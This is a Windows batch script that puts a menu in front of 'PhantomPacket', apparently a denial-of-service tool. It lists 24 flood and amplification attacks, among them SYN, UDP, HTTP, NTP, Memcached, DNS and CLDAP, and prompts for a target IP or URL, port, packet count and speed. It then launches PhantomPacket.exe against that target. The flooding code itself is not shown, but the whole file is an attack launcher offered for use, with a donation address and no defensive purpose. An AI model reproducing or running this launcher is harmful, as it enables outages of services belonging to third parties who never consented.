@echo off
title PhantomPacket
color 1F
:menu
cls
echo                     ^|
echo ____________    __ -+-  ____________
echo \_____     /   /_ \ ^|   \     _____/
echo  \_____    \____/  \____/    _____/
echo   \_____                    _____/
echo      \___________  ___________/
echo                /____\ PhantomPacket v1.0
echo.
echo Created by BayLak
echo Github : https://github.com/BayLak-ONE/
echo Donate BTC: bc1qctxfu3ar94gs3whjyrjl974dhe79wr6nex3txg
echo _______________________________________________________
echo.
echo 1. TCP Attack
echo 2. TCPM Attack
echo 3. UDP Attack
echo 4. UDPM Attack
echo 5. UCP Attack
echo 6. PING Attack
echo 7. NTP Attack
echo 8. HTTPV1 Attack
echo 9. HTTPV2 Attack
echo 10. HTTPV3 Attack
echo 11. SYN Attack
echo 12. IIPORT Attack
echo 13. IRPORT Attack
echo 14. ARP Attack
echo 15. DNS Attack
echo 16. SMB Attack
echo 17. SNMP Attack
echo 18. SMTP Attack
echo 19. MEMCACHED Attack
echo 20. FTP Attack
echo 21. TELNET Attack
echo 22. CHARGEN Attack
echo 23. LDAP Attack
echo 24. CLDAP Attack
echo 25. Help
echo 26. Exit
echo.
set /p choice=Choose an option (1-26): 
if "%choice%"=="25" (
    cls
    echo ==========================
    echo        Help Menu
    echo ==========================
    PhantomPacket.exe help
    pause
    goto menu
)
if "%choice%"=="26" exit
if "%choice%"=="1" set protocol=TCP
if "%choice%"=="2" set protocol=TCPM
if "%choice%"=="3" set protocol=UDP
if "%choice%"=="4" set protocol=UDPM
if "%choice%"=="5" set protocol=UCP
if "%choice%"=="6" set protocol=PING
if "%choice%"=="7" set protocol=NTP
if "%choice%"=="8" set protocol=HTTPV1
if "%choice%"=="9" set protocol=HTTPV2
if "%choice%"=="10" set protocol=HTTPV3
if "%choice%"=="11" set protocol=SYN
if "%choice%"=="12" set protocol=IIPORT
if "%choice%"=="13" set protocol=IRPORT
if "%choice%"=="14" set protocol=ARP
if "%choice%"=="15" set protocol=DNS
if "%choice%"=="16" set protocol=SMB
if "%choice%"=="17" set protocol=SNMP
if "%choice%"=="18" set protocol=SMTP
if "%choice%"=="19" set protocol=MEMCACHED
if "%choice%"=="20" set protocol=FTP
if "%choice%"=="21" set protocol=TELNET
if "%choice%"=="22" set protocol=CHARGEN
if "%choice%"=="23" set protocol=LDAP
if "%choice%"=="24" set protocol=CLDAP
if "%choice%"=="2" goto input_full_message
if "%choice%"=="4" goto input_full_message
if "%choice%"=="18" goto input_full_message
if "%choice%"=="9" goto input_httpv2_v3
if "%choice%"=="10" goto input_httpv2_v3
if "%choice%"=="8" goto input_httpv1
goto input_full

:input_full
cls
set /p target=Enter IP or URL: 
set /p port=Enter Port: 
set /p packets=Enter Number of Packets: 
set /p speed=Enter Speed: 

cls
echo ==========================
echo Attack Details:
echo ==========================
echo Protocol: %protocol%
echo Target: %target%
echo Port: %port%
echo Packets: %packets%
echo Speed: %speed%
echo ==========================
echo Running Attack...
PhantomPacket.exe %protocol% %target%:%port% %packets% %speed%
pause
goto menu

:input_full_message
cls
set /p target=Enter IP or URL: 
set /p port=Enter Port: 
set /p packets=Enter Number of Packets: 
set /p speed=Enter Speed: 
set /p message=Enter Message (optional, press Enter to skip): 

cls
echo ==========================
echo Attack Details:
echo ==========================
echo Protocol: %protocol%
echo Target: %target%
echo Port: %port%
echo Packets: %packets%
echo Speed: %speed%
if not "%message%"=="" echo Message: %message%
echo ==========================
echo Running Attack...
PhantomPacket.exe %protocol% %target%:%port% %packets% %speed% "%message%"
pause
goto menu

:input_httpv1
cls
set /p target=Enter URL: 
set /p packets=Enter Number of Packets: 
set /p speed=Enter Speed: 

cls
echo ==========================
echo Attack Details:
echo ==========================
echo Protocol: %protocol%
echo Target URL: %target%
echo Packets: %packets%
echo Speed: %speed%
echo ==========================
echo Running Attack...
PhantomPacket.exe %protocol% %target% %packets% %speed%
pause
goto menu

:input_httpv2_v3
cls
set /p target=Enter URL: 
set /p packets=Enter Number of Packets: 
set /p speed=Enter Speed: 
set /p bytes=Enter Bytes (optional, press Enter to skip): 

cls
echo ==========================
echo Attack Details:
echo ==========================
echo Protocol: %protocol%
echo Target URL: %target%
echo Packets: %packets%
echo Speed: %speed%
if not "%bytes%"=="" echo Bytes: %bytes%
echo ==========================
echo Running Attack...
if "%bytes%"=="" (
    PhantomPacket.exe %protocol% %target% %packets% %speed%
) else (
    PhantomPacket.exe %protocol% %target% %packets% %speed% %bytes%
)
pause
goto menu
